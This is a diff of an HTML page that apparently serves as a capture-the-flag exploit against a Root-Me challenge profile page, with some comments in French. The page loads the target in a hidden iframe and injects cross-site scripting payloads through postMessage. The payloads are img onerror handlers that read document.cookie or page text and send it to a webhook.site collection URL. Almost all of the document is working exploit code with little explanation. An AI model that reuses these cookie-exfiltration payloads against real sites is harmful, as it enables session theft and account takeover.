@@ -1,26 +1,25 @@
 <!DOCTYPE html>
 <html>
 <body>
+  <div id="output" ></div>
+  <iframe id="victim" src="http://challenge01.root-me.org:58003/profile" style="display:none"></iframe>
+  
 <script>
 var wb = 'http://webhook.site/3af7409d-4a67-4132-bbaa-05e16cad29ba';
-var iframe = document.createElement('iframe');
-iframe.src = 'http://challenge01.root-me.org:58003/profile';
-iframe.style.display = 'none';
-document.body.appendChild(iframe);
+var iframe = document.getElementById('victim');
 
 iframe.onload = function() {
   setTimeout(function() {
     // Si listener fait innerHTML = event.data
     iframe.contentWindow.postMessage(
-      '<img src=x onerror="new Image().src=\'' + wb + '?d=\'+btoa(document.body.innerText)">',
+     // '<img src=x onerror="new Image().src=\'' + wb + '?d=\'+btoa(document.cookie)">',
+      '<img src=x onerror="top.document.getElementById(\'output\').innerText=document.cookie">',
       '*'
     );
-    // Si listener fait eval(event.data)
     iframe.contentWindow.postMessage(
-      "new Image().src='" + wb + "?d='+btoa(document.body.innerText)",
+      '<img src=x onerror="new Image().src=\'' + wb + '?d=\'+document.cookie">',
       '*'
     );
-    new Image().src = wb + '?iframe=loaded';
   }, 1000);
 };
 </script>
